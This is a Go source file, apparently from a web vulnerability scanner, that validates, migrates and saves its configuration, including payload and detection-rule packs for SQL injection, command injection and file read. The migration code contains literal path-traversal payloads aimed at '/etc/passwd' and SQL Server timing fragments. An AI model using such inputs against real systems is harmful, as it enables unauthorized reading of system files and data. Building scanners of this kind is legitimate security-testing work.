		return errors.New("shared_service_mode 启用时必须配置 allowed_hosts，防止扫描器成为任意网络访问代理")
	}
	if len(c.SessionIdentifiers) > 500 {
		return errors.New("session_identifiers 不能超过 500 个 Key")
	}
	if len(c.ExcludedParameterNames) > 500 {
		return errors.New("excluded_parameter_names 不能超过 500 个参数名")
	}
	seenSessionKeys := make(map[string]bool, len(c.SessionIdentifiers))
	for _, key := range c.SessionIdentifiers {
		if strings.TrimSpace(key) == "" || len(key) > 128 || strings.ContainsAny(key, "\r\n") {
			return errors.New("session 标识 Key 不能为空、不能换行且不能超过 128 字符")
		}
		lower := strings.ToLower(key)
		if seenSessionKeys[lower] {
			return fmt.Errorf("session 标识 Key %q 重复", key)
		}
		seenSessionKeys[lower] = true
	}
	for name, values := range map[string][]string{
		"excluded_parameter_names": c.ExcludedParameterNames,
		"command_parameter_names":  c.CommandParameterNames,
		"csrf_header_names":        c.CSRFHeaderNames,
		"scan_header_names":        c.ScanHeaderNames,
	} {
		for _, value := range values {
			if strings.TrimSpace(value) == "" || len(value) > 128 || strings.ContainsAny(value, "\r\n") {
				return fmt.Errorf("%s 包含无效字段名", name)
			}
		}
	}
	for _, cidr := range c.ConfigWriteAllowedCIDRs {
		if _, _, err := net.ParseCIDR(cidr); err != nil {
			return fmt.Errorf("config_write_allowed_cidrs 包含无效 CIDR %q", cidr)
		}
	}
	if len(c.RequestTransforms) > 100 || len(c.ResponseExtractors) > 100 {
		return errors.New("动态请求规则不能超过 100 条")
	}
	for _, transform := range c.RequestTransforms {
		if strings.TrimSpace(transform.Name) == "" || strings.TrimSpace(transform.Destination) == "" ||
			!slices.Contains([]string{"timestamp", "uuid", "regex_replace", "sha256", "hmac-sha256", "base64"}, transform.Algorithm) {
			return fmt.Errorf("请求动态规则 %q 无效", transform.Name)
		}
		if !validDynamicDestination(transform.Destination) {
			return fmt.Errorf("请求动态规则 %q 的目标无效", transform.Name)
		}
		if transform.Pattern != "" {
			if _, err := regexp.Compile(transform.Pattern); err != nil {
				return fmt.Errorf("请求动态规则 %q 正则无效: %w", transform.Name, err)
			}
		}
	}
	for _, extractor := range c.ResponseExtractors {
		if strings.TrimSpace(extractor.Name) == "" || strings.TrimSpace(extractor.Source) == "" ||
			strings.TrimSpace(extractor.Destination) == "" {
			return errors.New("响应提取规则名称、来源和目标不能为空")
		}
		if _, err := regexp.Compile(extractor.Pattern); err != nil {
			return fmt.Errorf("响应提取规则 %q 正则无效: %w", extractor.Name, err)
		}
		if !validDynamicDestination(extractor.Destination) {
			return fmt.Errorf("响应提取规则 %q 的目标无效", extractor.Name)
		}
	}
	for _, value := range c.APIExposurePaths {
		if !strings.HasPrefix(value, "/") || len(value) > 512 || strings.ContainsAny(value, "\r\n") {
			return errors.New("api_exposure_paths 必须是以 / 开头的同源路径")
		}
	}
	if len(c.SQLiErrorPatterns) > 1000 {
		return errors.New("sqli_error_patterns 不能超过 1000 条")
	}
	if c.SQLiErrorConfidence != "" &&
		!slices.Contains([]string{"tentative", "firm", "certain", "待确认", "较确定", "已确认"}, c.SQLiErrorConfidence) {
		return errors.New("sqli_error_confidence 必须是 tentative、firm、certain、待确认、较确定或已确认")
	}
	for group, patterns := range map[string][]string{"success_patterns": c.SuccessPatterns, "denied_patterns": c.DeniedPatterns, "sqli_error_patterns": c.SQLiErrorPatterns, "dynamic_patterns": c.DynamicPatterns} {
		for _, pattern := range patterns {
			if group == "sqli_error_patterns" && strings.TrimSpace(pattern) == "" {
				return errors.New("sqli_error_patterns 不能包含空正则")
			}
			if len(pattern) > 10_000 {
				return fmt.Errorf("%s 包含超过 10000 字节的正则", group)
			}
			if _, err := regexp.Compile(pattern); err != nil {
				return fmt.Errorf("%s 包含无效正则 %q: %w", group, pattern, err)
			}
		}
	}
	for name, rawURL := range map[string]string{"proxy_url": c.ProxyURL, "callback_base_url": c.CallbackBaseURL} {
		if rawURL == "" {
			continue
		}
		parsed, err := url.Parse(rawURL)
		if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
			return fmt.Errorf("%s 必须是有效的 http/https URL", name)
		}
	}
	if parsed, err := url.Parse(c.CallbackLDAPBaseURL); err != nil || parsed.Scheme != "ldap" || parsed.Host == "" {
		return errors.New("callback_ldap_base_url 必须是有效的 ldap:// URL")
	}
	if len(c.PluginRules) > 100 {
		return errors.New("plugin_rules 不能超过 100 个插件")
	}
	for pluginID, rule := range c.PluginRules {
		if strings.TrimSpace(pluginID) == "" || len(pluginID) > 128 {
			return errors.New("plugin_rules 包含无效插件 ID")
		}
		if len(rule.ParameterNames) > 500 || len(rule.URLKeywords) > 100 || len(rule.Paths) > 500 || len(rule.Payloads) > 1000 || len(rule.Patterns) > 1000 {
			return fmt.Errorf("plugin_rules[%q] 规则数量超过限制", pluginID)
		}
		for _, name := range rule.ParameterNames {
			if strings.TrimSpace(name) == "" || len(name) > 256 || strings.ContainsAny(name, "\r\n") {
				return fmt.Errorf("plugin_rules[%q] 包含无效参数名", pluginID)
			}
		}
		for _, keyword := range rule.URLKeywords {
			if strings.TrimSpace(keyword) == "" || len(keyword) > 256 || strings.ContainsAny(keyword, "\r\n") {
				return fmt.Errorf("plugin_rules[%q] 包含无效 URL 关键字", pluginID)
			}
		}
		for _, targetPath := range rule.Paths {
			if !strings.HasPrefix(targetPath, "/") || len(targetPath) > 2048 || strings.ContainsAny(targetPath, "\r\n") {
				return fmt.Errorf("plugin_rules[%q] 包含无效同源路径", pluginID)
			}
		}
		for _, payload := range rule.Payloads {
			if strings.TrimSpace(payload.Name) == "" || payload.Payload == "" || len(payload.Payload) > 100_000 {
				return fmt.Errorf("plugin_rules[%q] 包含名称或 payload 为空的规则", pluginID)
			}
			if payload.Mode != "" && !slices.Contains([]string{"passive", "normal", "standard", "deep"}, payload.Mode) {
				return fmt.Errorf("plugin_rules[%q] payload %q 的 mode 无效", pluginID, payload.Name)
			}
			if strings.ContainsAny(payload.Header, "\r\n") {
				return fmt.Errorf("plugin_rules[%q] payload %q 的 Header 无效", pluginID, payload.Name)
			}
		}
		if err := validateSQLPayloadRules(pluginID, rule.Payloads); err != nil {
			return err
		}
		for _, pattern := range rule.Patterns {
			if strings.TrimSpace(pattern.Name) == "" || strings.TrimSpace(pattern.Pattern) == "" {
				return fmt.Errorf("plugin_rules[%q] 包含空检测规则", pluginID)
			}
			if _, err := regexp.Compile(pattern.Pattern); err != nil {
				return fmt.Errorf("plugin_rules[%q] 检测规则 %q 正则无效: %w", pluginID, pattern.Name, err)
			}
			if pattern.Severity != "" && !slices.Contains([]string{"info", "low", "medium", "high", "critical", "提示", "低危", "中危", "高危", "严重"}, pattern.Severity) {
				return fmt.Errorf("plugin_rules[%q] 检测规则 %q severity 无效", pluginID, pattern.Name)
			}
			if pattern.Confidence != "" && !slices.Contains([]string{"tentative", "firm", "certain", "待确认", "较确定", "已确认"}, pattern.Confidence) {
				return fmt.Errorf("plugin_rules[%q] 检测规则 %q confidence 无效", pluginID, pattern.Name)
			}
		}
	}
	return nil
}

func validateSQLPayloadRules(pluginID string, payloads []PayloadRule) error {
	type pairSpec struct {
		left  string
		right string
	}
	specsByPlugin := map[string][]pairSpec{
		"sqli": {
			{left: "error_break", right: "error_repair"},
			{left: "conditional_control", right: "conditional_error"},
			{left: "boolean_true", right: "boolean_false"},
		},
		"sqli_extended": {
			{left: "error_break", right: "error_repair"},
			{left: "conditional_control", right: "conditional_error"},
			{left: "boolean_true", right: "boolean_false"},
		},
		"sqli_timing":   {{left: "time_control", right: "time_delay"}},
		"sqli_order_by": {{left: "conditional_control", right: "conditional_error"}, {left: "time_control", right: "time_delay"}},
		"sqli_limit":    {{left: "error_break", right: "error_repair"}},
	}
	specs, pairedPlugin := specsByPlugin[pluginID]
	if !pairedPlugin && pluginID != "mybatis_dynamic_sql" {
		return nil
	}

	allowedKinds := make(map[string]bool)
	counterpart := make(map[string]string)
	for _, spec := range specs {
		allowedKinds[spec.left], allowedKinds[spec.right] = true, true
		counterpart[spec.left], counterpart[spec.right] = spec.right, spec.left
	}
	if pluginID == "mybatis_dynamic_sql" {
		allowedKinds["fragment_break"] = true
	}

	seen := make(map[string][]PayloadRule)
	for _, payload := range payloads {
		kind := strings.TrimSpace(payload.Kind)
		group := strings.TrimSpace(payload.Group)
		if !allowedKinds[kind] {
			return fmt.Errorf("plugin_rules[%q] payload %q 的 SQL kind %q 无效", pluginID, payload.Name, payload.Kind)
		}
		exactReplacement := pluginID == "sqli_timing" && group == "mysql-sleep-and-select-exact-replace" &&
			(kind == "time_control" || kind == "time_delay")
		if !exactReplacement && !strings.Contains(payload.Payload, "{{value}}") {
			return fmt.Errorf("plugin_rules[%q] payload %q 缺少 {{value}} 占位符", pluginID, payload.Name)
		}
		if kind == "fragment_break" {
			continue
		}
		if group == "" {
			return fmt.Errorf("plugin_rules[%q] payload %q 的 SQL group 不能为空", pluginID, payload.Name)
		}
		key := kind + "\x00" + strings.ToLower(group)
		// Multiple pairs may intentionally share one group. Runtime pairs them
		// by configuration order, which lets administrators add safe context
		// variants without inventing artificial group names. The counts of both
		// sides are validated below so no rule can be silently dropped.
		seen[key] = append(seen[key], payload)
		if kind == "time_control" || kind == "time_delay" {
			seconds, err := strconv.ParseFloat(strings.TrimSpace(payload.Expected), 64)
			if err != nil || seconds <= 0 || seconds > 10 {
				return fmt.Errorf("plugin_rules[%q] payload %q 的 expected 必须是 0 到 10 秒之间的数字", pluginID, payload.Name)
			}
		}
	}
	for key, payloads := range seen {
		separator := strings.IndexByte(key, '\x00')
		kind, group := key[:separator], key[separator+1:]
		paired := seen[counterpart[kind]+"\x00"+group]
		if len(paired) != len(payloads) {
			return fmt.Errorf("plugin_rules[%q] SQL 组 %q 的 kind %q 数量为 %d，缺少配对 kind %q（数量为 %d）",
				pluginID, payloads[0].Group, kind, len(payloads), counterpart[kind], len(paired))
		}
	}
	return nil
}

func validDynamicDestination(value string) bool {
	value = strings.TrimSpace(value)
	if value == "body" {
		return true
	}
	if len(value) > 512 || strings.ContainsAny(value, "\r\n") {
		return false
	}
	lower := strings.ToLower(value)
	for _, prefix := range []string{"header:", "query:", "json:", "cookie:", "form:", "multipart:"} {
		if strings.HasPrefix(lower, prefix) {
			return strings.TrimSpace(value[len(prefix):]) != ""
		}
	}
	return false
}

type Store struct {
	path string
	mu   sync.RWMutex
	cfg  Config
}

func Open(path string) (*Store, error) {
	s := &Store{path: path, cfg: Default()}
	data, err := os.ReadFile(path)
	if err != nil {
		if !errors.Is(err, os.ErrNotExist) {
			return nil, err
		}
		if err := s.Save(s.cfg); err != nil {
			return nil, err
		}
		return s, nil
	}
	var metadata struct {
		ConfigVersion *int `json:"config_version"`
	}
	if err := json.Unmarshal(data, &metadata); err != nil {
		return nil, fmt.Errorf("解析配置文件 %s: %w", path, err)
	}
	if err := json.Unmarshal(data, &s.cfg); err != nil {
		return nil, fmt.Errorf("解析配置文件 %s: %w", path, err)
	}
	needsSave := metadata.ConfigVersion == nil || *metadata.ConfigVersion < currentConfigVersion
	if needsSave {
		upgradeConfig(&s.cfg)
	}
	if err := s.cfg.Validate(); err != nil {
		return nil, fmt.Errorf("配置文件校验失败: %w", err)
	}
	if needsSave {
		if err := s.Save(s.cfg); err != nil {
			return nil, fmt.Errorf("升级配置文件 %s: %w", path, err)
		}
	}
	return s, nil
}

func upgradeConfig(cfg *Config) {
	defaults := Default()
	cfg.ExcludedParameterNames = normalizeUniqueNames(cfg.ExcludedParameterNames)
	if cfg.MaxQueuedScans == 0 {
		cfg.MaxQueuedScans = defaults.MaxQueuedScans
	}
	if cfg.NormalPlugins == nil {
		cfg.NormalPlugins = append([]string(nil), defaults.NormalPlugins...)
	} else if slices.Equal(cfg.NormalPlugins, []string{"reflected_xss", "file_read", "file_upload", "error_disclosure", "unauthorized", "cors", "sqli", "xxe", "sms_abuse"}) {
		// Upgrade only the historical built-in Normal preset. A user-maintained
		// normal_plugins list remains authoritative.
		cfg.NormalPlugins = append([]string(nil), defaults.NormalPlugins...)
	}
	if cfg.GlobalMaxConcurrency == 0 {
		cfg.GlobalMaxConcurrency = defaults.GlobalMaxConcurrency
	}
	if cfg.PerHostConcurrency == 0 {
		cfg.PerHostConcurrency = defaults.PerHostConcurrency
	}
	if cfg.GlobalRequestsPerSecond == 0 {
		cfg.GlobalRequestsPerSecond = defaults.GlobalRequestsPerSecond
	}
	if cfg.CallbackListen == "" {
		cfg.CallbackListen = defaults.CallbackListen
	}
	if cfg.CallbackBaseURL == "" {
		cfg.CallbackBaseURL = defaults.CallbackBaseURL
	}
	if cfg.CallbackLDAPListen == "" {
		cfg.CallbackLDAPListen = defaults.CallbackLDAPListen
	}
	if cfg.CallbackLDAPBaseURL == "" {
		cfg.CallbackLDAPBaseURL = defaults.CallbackLDAPBaseURL
	}
	if cfg.CallbackMaxConnections == 0 {
		cfg.CallbackMaxConnections = defaults.CallbackMaxConnections
	}
	if cfg.TransportMode == "" {
		cfg.TransportMode = defaults.TransportMode
	}
	if cfg.MaxScansPerMinute == 0 {
		cfg.MaxScansPerMinute = defaults.MaxScansPerMinute
	}
	if cfg.ScanHeaderNames == nil {
		cfg.ScanHeaderNames = append([]string(nil), defaults.ScanHeaderNames...)
	}
	cfg.CommandParameterNames = mergeUniqueStrings(cfg.CommandParameterNames, defaults.CommandParameterNames)
	if cfg.SQLiErrorPatterns == nil {
		cfg.SQLiErrorPatterns = append([]string(nil), defaults.SQLiErrorPatterns...)
	}
	if cfg.SQLiErrorConfidence == "" {
		cfg.SQLiErrorConfidence = defaults.SQLiErrorConfidence
	}
	if cfg.PluginRules == nil {
		cfg.PluginRules = make(map[string]PluginRuleConfig)
	}
	// V2.0 config v15 migrates every historical mode=deep payload into an
	// explicit extension plugin before recommended defaults are merged.
	splitDeepPluginRules(cfg.PluginRules)
	// V3.6.2 replaces the original query value for the quoted MySQL timing
	// oracle. Appending to a non-empty value produces a different SQL context
	// from the manually verified payload, so retain that older fallback only
	// where it is useful and remove the malformed historical tail variant.
	timing := cfg.PluginRules["sqli_timing"]
	filteredTiming := timing.Payloads[:0]
	for _, payload := range timing.Payloads {
		if payload.Group == "mysql-sleep-and-select-string" {
			continue
		}
		filteredTiming = append(filteredTiming, payload)
	}
	timing.Payloads = filteredTiming
	cfg.PluginRules["sqli_timing"] = timing
	configured := cfg.PluginRules["sqli"]
	recommended := defaults.PluginRules["sqli"]
	filteredPayloads := configured.Payloads[:0]
	for _, payload := range configured.Payloads {
		group := strings.ToLower(payload.Group)
		name := strings.ToLower(payload.Name)
		value := strings.ToLower(payload.Payload)
		if strings.HasPrefix(group, "mssql-") || strings.Contains(name, "sql server") ||
			strings.Contains(value, "waitfor delay") || strings.Contains(value, "convert(int,") {
			continue
		}
		filteredPayloads = append(filteredPayloads, payload)
	}
	configured.Payloads = filteredPayloads
	filteredPatterns := configured.Patterns[:0]
	for _, pattern := range configured.Patterns {
		if pattern.Name == "SQL Server/JDBC 异常" || pattern.Name == "MyBatis/Spring 数据访问异常" {
			continue
		}
		filteredPatterns = append(filteredPatterns, pattern)
	}
	configured.Patterns = filteredPatterns
	seenPayload := make(map[string]bool, len(configured.Payloads))
	for _, payload := range configured.Payloads {
		seenPayload[payload.Kind+"\x00"+payload.Group] = true
	}
	for _, payload := range recommended.Payloads {
		key := payload.Kind + "\x00" + payload.Group
		if !seenPayload[key] {
			configured.Payloads = append(configured.Payloads, payload)
			seenPayload[key] = true
		}
	}
	seenPattern := make(map[string]bool, len(configured.Patterns))
	for _, pattern := range configured.Patterns {
		seenPattern[pattern.Name] = true
	}
	for _, pattern := range recommended.Patterns {
		if !seenPattern[pattern.Name] {
			configured.Patterns = append(configured.Patterns, pattern)
		}
	}
	cfg.PluginRules["sqli"] = configured
	sensitive := cfg.PluginRules["sensitive_data"]
	linuxSensitive := sensitive.Patterns[:0]
	for _, pattern := range sensitive.Patterns {
		if pattern.Name == "绝对文件路径" || strings.Contains(pattern.Pattern, `[A-Za-z]:\\`) {
			continue
		}
		linuxSensitive = append(linuxSensitive, pattern)
	}
	sensitive.Patterns = linuxSensitive
	seenSensitive := make(map[string]bool, len(sensitive.Patterns))
	for _, pattern := range sensitive.Patterns {
		seenSensitive[pattern.Name] = true
	}
	for _, pattern := range defaults.PluginRules["sensitive_data"].Patterns {
		if !seenSensitive[pattern.Name] {
			sensitive.Patterns = append(sensitive.Patterns, pattern)
		}
	}
	cfg.PluginRules["sensitive_data"] = sensitive
	fileRead := cfg.PluginRules["file_read"]
	linuxPayloads := fileRead.Payloads[:0]
	for _, payload := range fileRead.Payloads {
		if strings.Contains(strings.ToLower(payload.Name), "windows") || strings.Contains(strings.ToLower(payload.Payload), "win.ini") {
			continue
		}
		if (payload.Name == "Linux 目录穿越" && payload.Payload == "../../../../../../etc/passwd") ||
			(payload.Name == "Linux 绝对路径" && payload.Payload == "/etc/passwd") ||
			(payload.Name == "双重编码穿越" && strings.Contains(payload.Payload, "etc%252fpasswd")) {
			continue
		}
		linuxPayloads = append(linuxPayloads, payload)
	}
	fileRead.Payloads = linuxPayloads
	cfg.PluginRules["file_read"] = mergePluginRuleDefaults(fileRead, defaults.PluginRules["file_read"])
	cfg.PluginRules["file_upload"] = mergePluginRuleDefaults(cfg.PluginRules["file_upload"], defaults.PluginRules["file_upload"])
	errorDisclosure := cfg.PluginRules["error_disclosure"]
	linuxErrorPatterns := errorDisclosure.Patterns[:0]
	for _, pattern := range errorDisclosure.Patterns {
		if pattern.Name == "服务端绝对路径" || strings.Contains(pattern.Pattern, `[A-Za-z]:\\`) {
			continue
		}
		linuxErrorPatterns = append(linuxErrorPatterns, pattern)
	}
	errorDisclosure.Patterns = linuxErrorPatterns
	cfg.PluginRules["error_disclosure"] = mergePluginRuleDefaults(errorDisclosure, defaults.PluginRules["error_disclosure"])
	globalJavaPaths := cfg.APIExposurePaths[:0]
	for _, targetPath := range cfg.APIExposurePaths {
		if !strings.Contains(strings.ToLower(targetPath), "graphql") {
			globalJavaPaths = append(globalJavaPaths, targetPath)
		}
	}
	cfg.APIExposurePaths = mergeUniqueStrings(globalJavaPaths, defaults.APIExposurePaths)
	apiExposure := cfg.PluginRules["api_exposure"]
	javaPaths := apiExposure.Paths[:0]
	for _, targetPath := range apiExposure.Paths {
		if strings.Contains(strings.ToLower(targetPath), "graphql") {
			continue
		}
		javaPaths = append(javaPaths, targetPath)
	}
	apiExposure.Paths = javaPaths
	cfg.PluginRules["api_exposure"] = mergePluginRuleDefaults(apiExposure, defaults.PluginRules["api_exposure"])
	command := cfg.PluginRules["command_injection"]
	for index := range command.Payloads {
		if command.Payloads[index].Kind == "output" &&
			(strings.Contains(command.Payloads[index].Payload, "printf {{token}}") || command.Payloads[index].Expected == "") {
			command.Payloads[index] = defaults.PluginRules["command_injection"].Payloads[0]
		}
	}
	cfg.PluginRules["command_injection"] = mergePluginRuleDefaults(command, defaults.PluginRules["command_injection"])
	// V2.3 intentionally replaces the historical Jackson/Fastjson multi-signal
	// rule pack. Keeping old @class payloads or "blocked = info" patterns would
	// silently restore the semantics that this version removes.
	cfg.PluginRules["json_polymorphic"] = defaults.PluginRules["json_polymorphic"]
	orderBy := cfg.PluginRules["sqli_order_by"]
	orderPayloads := orderBy.Payloads[:0]
	for _, payload := range orderBy.Payloads {
		if payload.Group == "mysql-order-exp" || payload.Group == "mysql-order-sleep" {
			continue
		}
		orderPayloads = append(orderPayloads, payload)
	}
	orderBy.Payloads = orderPayloads
	cfg.PluginRules["sqli_order_by"] = mergePluginRuleDefaults(orderBy, defaults.PluginRules["sqli_order_by"])
	graphql := cfg.PluginRules["graphql_security"]
	for index := range graphql.Payloads {
		switch graphql.Payloads[index].Name {
		case "JSON 批量请求":
			graphql.Payloads[index] = defaults.PluginRules["graphql_security"].Payloads[2]
		case "别名批处理":
			graphql.Payloads[index] = defaults.PluginRules["graphql_security"].Payloads[3]
		}
	}
	cfg.PluginRules["graphql_security"] = graphql
	for _, pluginID := range []string{
		"xxe", "ssrf", "spring_actuator", "nosql_injection", "ldap_injection", "xpath_injection",
		"java_deserialization", "method_override", "mass_assignment", "graphql_security",
		"mybatis_dynamic_sql", "path_normalization", "parameter_confusion", "json_polymorphic",
		"sms_abuse", "shiro", "java_expression", "jndi_injection", "host_header_injection",
		"sqli_extended", "sqli_timing", "sqli_order_by", "sqli_limit", "xxe_extended", "file_read_encoded", "file_upload_execution",
		"command_injection_oast", "command_injection_timing", "java_expression_extended",
		"mass_assignment_extended", "graphql_alias_abuse", "error_disclosure_extended",
	} {
		cfg.PluginRules[pluginID] = mergePluginRuleDefaults(cfg.PluginRules[pluginID], defaults.PluginRules[pluginID])
	}
	// V3.6.3 displays evidence with the original values as requested by the
	// scanner workflow. Clear the old masking default during config upgrade.
	cfg.RedactEvidence = false
	cfg.ConfigVersion = currentConfigVersion
}

func mergeUniqueStrings(configured, recommended []string) []string {
	seen := make(map[string]bool, len(configured)+len(recommended))
	result := make([]string, 0, len(configured)+len(recommended))
	values := append(append([]string(nil), configured...), recommended...)
	for _, value := range values {
		if value == "" || seen[value] {
			continue
		}
		seen[value] = true
		result = append(result, value)
	}
	return result
}

func mergePluginRuleDefaults(configured, recommended PluginRuleConfig) PluginRuleConfig {
	seenParameter := make(map[string]bool)
	for _, value := range configured.ParameterNames {
		seenParameter[strings.ToLower(value)] = true
	}
	for _, value := range recommended.ParameterNames {
		if !seenParameter[strings.ToLower(value)] {
			configured.ParameterNames = append(configured.ParameterNames, value)
		}
	}
	seenKeyword := make(map[string]bool)
	for _, value := range configured.URLKeywords {
		seenKeyword[strings.ToLower(value)] = true
	}
	for _, value := range recommended.URLKeywords {
		if !seenKeyword[strings.ToLower(value)] {
			configured.URLKeywords = append(configured.URLKeywords, value)
		}
	}
	seenPath := make(map[string]bool)
	for _, value := range configured.Paths {
		seenPath[value] = true
	}
	for _, value := range recommended.Paths {
		if !seenPath[value] {
			configured.Paths = append(configured.Paths, value)
		}
	}
	seenPayload := make(map[string]bool)
	for _, value := range configured.Payloads {
		seenPayload[value.Name] = true
	}
	for _, value := range recommended.Payloads {
		if !seenPayload[value.Name] {
			configured.Payloads = append(configured.Payloads, value)
		}
	}
	seenPattern := make(map[string]bool)
	for _, value := range configured.Patterns {
		seenPattern[value.Name] = true
	}
	for _, value := range recommended.Patterns {
		if !seenPattern[value.Name] {
			configured.Patterns = append(configured.Patterns, value)
		}
	}
	return configured
}

func (s *Store) Get() Config {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return clone(s.cfg)
}

func (s *Store) Path() string { return s.path }

func (s *Store) Save(cfg Config) error {
	// Canonicalize a submitted configuration before validating and persisting it.
	// This also migrates legacy mode=deep payloads into explicit extension plugin
	// rules, so the stored behavior never depends on an invisible scan mode.
	cfg = clone(cfg)
	cfg.ExcludedParameterNames = normalizeUniqueNames(cfg.ExcludedParameterNames)
	splitDeepPluginRules(cfg.PluginRules)
	cfg.ConfigVersion = currentConfigVersion
	if err := cfg.Validate(); err != nil {
		return err
	}
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	data = append(data, '\n')
	dir := filepath.Dir(s.path)
	if err := os.MkdirAll(dir, 0o750); err != nil {
		return err
	}
	tmp, err := os.CreateTemp(dir, ".config-*.tmp")
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	ok := false
	defer func() {
		_ = tmp.Close()
		if !ok {
			_ = os.Remove(tmpName)
		}
	}()
	if err := tmp.Chmod(0o640); err != nil {
		return err
	}
	if _, err := tmp.Write(data); err != nil {
		return err
	}
	if err := tmp.Sync(); err != nil {
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	if err := os.Rename(tmpName, s.path); err != nil {
		return err
	}
	s.mu.Lock()
	s.cfg = clone(cfg)
	s.mu.Unlock()
	ok = true
	return nil
}

func normalizeUniqueNames(values []string) []string {
	seen := make(map[string]bool, len(values))
	result := make([]string, 0, len(values))
	for _, value := range values {
		value = strings.TrimSpace(value)
		key := strings.ToLower(value)
		if value == "" || seen[key] {
			continue
		}
		seen[key] = true
		result = append(result, value)
	}
	return result
}

func clone(cfg Config) Config {
	// Store.Get is on every task/API hot path. A JSON marshal/unmarshal clone of
	// the full rule pack caused avoidable CPU, allocation and GC pressure.
	out := cfg
	out.AllowedHosts = append([]string(nil), cfg.AllowedHosts...)
	out.NormalPlugins = append([]string(nil), cfg.NormalPlugins...)
	out.SessionIdentifiers = append(SessionKeyList(nil), cfg.SessionIdentifiers...)
	out.ExcludedParameterNames = append([]string(nil), cfg.ExcludedParameterNames...)
	out.CommandParameterNames = append([]string(nil), cfg.CommandParameterNames...)
	out.CSRFHeaderNames = append([]string(nil), cfg.CSRFHeaderNames...)
	out.APIExposurePaths = append([]string(nil), cfg.APIExposurePaths...)
	out.SuccessPatterns = append([]string(nil), cfg.SuccessPatterns...)
	out.DeniedPatterns = append([]string(nil), cfg.DeniedPatterns...)
	out.SQLiErrorPatterns = append([]string(nil), cfg.SQLiErrorPatterns...)
	out.DynamicPatterns = append([]string(nil), cfg.DynamicPatterns...)
	out.ScanHeaderNames = append([]string(nil), cfg.ScanHeaderNames...)
	out.ConfigWriteAllowedCIDRs = append([]string(nil), cfg.ConfigWriteAllowedCIDRs...)
	out.RequestTransforms = append([]RequestTransform(nil), cfg.RequestTransforms...)
	out.ResponseExtractors = append([]ResponseExtractor(nil), cfg.ResponseExtractors...)
	out.HostOverrides = make(map[string]string, len(cfg.HostOverrides))
	for key, value := range cfg.HostOverrides {
		out.HostOverrides[key] = value
	}
	out.PluginRules = make(map[string]PluginRuleConfig, len(cfg.PluginRules))
	for id, rule := range cfg.PluginRules {
		rule.ParameterNames = append([]string(nil), rule.ParameterNames...)
		rule.Paths = append([]string(nil), rule.Paths...)
		rule.Payloads = append([]PayloadRule(nil), rule.Payloads...)
		rule.Patterns = append([]DetectionRule(nil), rule.Patterns...)
		out.PluginRules[id] = rule
	}
	return out
}
